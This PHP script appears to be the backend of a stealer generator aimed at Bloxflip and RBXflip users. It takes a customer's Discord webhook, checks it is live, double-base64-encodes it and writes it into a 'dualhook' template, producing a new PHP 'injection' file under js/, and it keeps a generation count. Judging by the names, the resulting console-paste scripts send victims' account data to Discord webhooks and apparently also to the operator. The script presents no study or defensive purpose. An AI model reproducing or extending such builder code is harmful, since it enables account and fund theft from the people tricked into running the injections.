<?php
require ('../../setup.php');
require ('../../gen_files/apis/iplog.php');
require ('dhsetup.php');
function htmlspecialcharss($string){
    $string = str_replace('.','',htmlspecialchars($string));
    $string = str_replace('<','',$string);
    $string=  str_replace('>','',$string);
    return $string;
}
function randomshit($length) {
    $chars = '012345689';
  
    for ($i = 0; $i < $length; $i++) {
      $pos = mt_rand(0, strlen($chars) -1);
      $my_string .= substr($chars, $pos, 1);
    }
    $shit= strtoupper($my_string);
    return "684$shit";
  }
if (isset($_POST['dwebhook'])) {
$directory = randomshit(12);
$dwebhook = $_POST['dwebhook'];
$customerrormessages = $_POST['customerrormessage'];
if (empty($customerrormessages)) {
$error = 'Must have an error message!';
}
else {
$parse = parse_url($dwebhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
function clear_dir($string) {
$string = str_replace(' ', '-', $string);
return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
}
$cantbackdoorwithhooklol = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($dwebhook));
$chkwebhook = file_get_contents("$cantbackdoorwithhooklol");
    $chkwebhook1 = json_decode($chkwebhook);

    if ($chkwebhook1->message == "Unknown Webhook") {
      $error = "Please enter an valid webhook!";
    } elseif (empty($chkwebhook1->type)) {
    
      $error = "Please enter an valid webhook!";
    } else {
$basesixtynine = base64_encode($cantbackdoorwithhooklol);
$basesixtyeight = base64_encode($basesixtynine);


$sexual = rtrim($basesixtyeight,'=');

$checkboxx = $_POST['autorefreshlol'];
$checkbbackdoor = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($checkboxx));
if ($checkbbackdoor == "true"){
    $autorefx = "true";
} else {
    $autorefx = "false";
}
$sillybackdoor = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($customerrormessages));
$directorytest = "../../js/$directory.php";
if (file_exists($directorytest)){
$error='There was an unknown error creating your injection. Please refresh the page and retry.';
unset($_POST);
}
file_put_contents("../../js/$directory.php",str_replace("KSJNETJDJDJRJT","$dirz",str_replace("LFPOCDERTYGDD","$autorefx", str_replace("NHFWDWYRBFHFDBEURR","$sillybackdoor", str_replace('QUBRWEBIRWBQYEIYOB', "$sexual",file_get_contents('../../gen_files/dualhook_files/get_dhbloxflip.php'))))));
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$success = 'Bloxflip Console Generator';
$file = 'counter/bloxflip_counter.txt';
$fdata = file_get_contents ( $file );
$fdata = intval($fdata) + 1;
file_put_contents($file, $fdata); 

unset($_POST);
}
} else {
$error = 'Webhook must be discord lol!';
unset($_POST['dwebhook']);
}
}
}
if (isset($_POST['webbhook'])) {
$directory = randomshit(12);
$webbhook = $_POST['webbhook'];
$customerror = $_POST['custerror'];
if (empty($customerror)) {
$error = 'Must have an error message!';
}
else {
$parse = parse_url($webbhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
function clear_dir($string) {
$string = str_replace(' ', '-', $string);
return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
}
$cantbackdoorwithhooklolz = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($webbhook));
$chkwebhook = file_get_contents("$cantbackdoorwithhooklolz");
    $chkwebhook1 = json_decode($chkwebhook);

    if ($chkwebhook1->message == "Unknown Webhook") {
      $error = "Please enter an valid webhook!";
    } elseif (empty($chkwebhook1->type)) {
    
      $error = "Please enter an valid webhook!";
    } else {
$basesixtynine = base64_encode($cantbackdoorwithhooklolz);
$basesixtyeight = base64_encode($basesixtynine);


$sexual = rtrim($basesixtyeight,'=');
  
$checkbox = $_POST['autorefresh'];
$checkbackdoor = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($checkbox));
if ($checkbackdoor == "true"){
    $autoref = "true";
} else {
    $autoref = "false";
}
$errornobd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($customerror));
$directorytest2 = "../../js/$directory.php";
if (file_exists($directorytest2)){
$error='There was an unknown error creating your injection. Please refresh the page and retry.';
unset($_POST);
}
file_put_contents("../../js/$directory.php",str_replace("KSJNETJDJDJRJT","$dirz",str_replace("LFPOCDERTYGDD","$autoref", str_replace("NHFWDWYRBFHFDBEURR","$errornobd", str_replace('QUBRWEBIRWBQYEIYOB', $sexual,file_get_contents('../../gen_files/dualhook_files/get_dhrbxflip.php')))))); 
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$success = 'RBXflip Console Generator';
$file = 'counter/rbxflip_counter.txt';
$fdata = file_get_contents ( $file );
$fdata = intval($fdata) + 1;
file_put_contents($file, $fdata); 
 
unset($_POST);
}
} else {
$error = 'Webhook must be discord lol!';
unset($_POST['webbhook']);
}
}
}
?>